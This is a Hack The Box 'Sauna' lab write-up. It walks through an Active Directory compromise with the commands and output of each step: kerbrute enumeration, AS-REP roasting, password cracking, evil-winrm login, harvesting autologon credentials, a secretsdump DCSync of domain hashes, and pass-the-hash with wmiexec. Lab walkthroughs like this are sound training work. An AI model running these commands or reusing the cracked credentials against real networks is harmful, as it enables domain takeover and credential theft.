# Sauna
## User

On the Website we can find some user in the bottom of /about/html
this usernames as john smith -> jsmith in the usernames.txt wordlist
from here use kerbrute to see which one is a valid kerberos username 
```
➜  kerbrute git:(master) python kerbrute.py -users ../HackTheBox/sauna/usernames.txt -domain EGOTISTICAL-BANK.LOCAL
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Valid user => fsmith [NOT PREAUTH]
[*] No passwords were discovered :'(
```
```
➜  examples git:(master) python GetNPUsers.py EGOTISTICAL-BANK.LOCAL/fsmith -format hashcat -outputfile hashes.asreproast
Impacket v0.9.21.dev1+20200214.111603.5259ed0f - Copyright 2020 SecureAuth Corporation

Password:
[*] Cannot authenticate fsmith, getting its TGT
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:385844ba0ec1ce2d8e4392cce9285216$096d03869feb764d4b753581ab15253234b15878e08ed904eac40d3f13cfb39dc551fc3fe4f2c1ddcf6aaf5a732aca31119d2cafae5d273d280fd20b472a39046daaaddb0f56a8318aae8bcc602703f4e4873ce76ae6f1080b57d5ac917aa607862145de79a7a1fc380e6cd6738d8f44726f19d61890769d867ec24291346be99e4e738ee53e86cb2d5485302f8311bf8cb6ee5380b94d6135191b3b305643b2280eb859a0736c09743950ff09422d8f1fa82526f026e534dfa72f1e2ecdf5f660c005e541c0e616e2790d3d88ab65546ea78af598703641f7578ec4028f439b85af58b23e736800ef0fc11f9eac2e3b03709058e972603cd38d3d8e6fb080d2
```
```
➜  sauna git:(master) ✗ john tgt_smith --wordlist=/home/floki/wordlists/rockyou.txt --show
Invalid options combination or duplicate option: "--show"
➜  sauna git:(master) ✗ john tgt_smith --show                                             
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:Thestrokes23
```
from here we can log in with evil-winrm as:
```
ruby evil-winrm.rb -i 10.10.10.175 -u fsmith -p Thestrokes23
```

found this on the machine thanks to winpeas:
```
[*] Checking for Autologon credentials in registry...


DefaultDomainName    : EGOTISTICALBANK
DefaultUserName      : EGOTISTICALBANK\svc_loanmanager
DefaultPassword      : Moneymakestheworldgoround!
AltDefaultDomainName :
AltDefaultUserName   :
AltDefaultPassword   :
```
so after a net users command we can try:
```
ruby evil-winrm.rb -i 10.10.10.175 -u svc_loanmgr -p Moneymakestheworldgoround!
```

```
python secretsdump.py EGOTISTICALBANK/svc_loanmgr:'Moneymakestheworldgoround!'@10.10.10.175
Impacket v0.9.21.dev1+20200214.111603.5259ed0f - Copyright 2020 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:7a2965077fddedf348d938e4fa20ea1b:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:987e26bb845e57df4c7301753f6cb53fcf993e1af692d08fd07de74f041bf031
Administrator:aes128-cts-hmac-sha1-96:145e4d0e4a6600b7ec0ece74997651d0
Administrator:des-cbc-md5:19d5f15d689b1ce5
krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24
krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9
krbtgt:des-cbc-md5:c170d5dc3edfc1d9
EGOTISTICAL-BANK.LOCAL\HSmith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324
EGOTISTICAL-BANK.LOCAL\HSmith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9
EGOTISTICAL-BANK.LOCAL\HSmith:des-cbc-md5:1c73b99168d3f8c7
EGOTISTICAL-BANK.LOCAL\FSmith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2
EGOTISTICAL-BANK.LOCAL\FSmith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b
EGOTISTICAL-BANK.LOCAL\FSmith:des-cbc-md5:b50e02ab0d85f76b
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:des-cbc-md5:2a896d16c28cf4a2
SAUNA$:aes256-cts-hmac-sha1-96:a90968c91de5f77ac3b7d938bd760002373f71e14e1a027b2d93d1934d64754a
SAUNA$:aes128-cts-hmac-sha1-96:0bf0c486c1262ab6cf46b16dc3b1b198
SAUNA$:des-cbc-md5:b989ecc101ae4ca1
[*] Cleaning up... 
```
il n'y a plus qu'a se co grace au hash :
```
python wmiexec.py -hashes :d9485863c1e9e05851aa40cbb4ab9dff Administrator@10.10.10.175
```
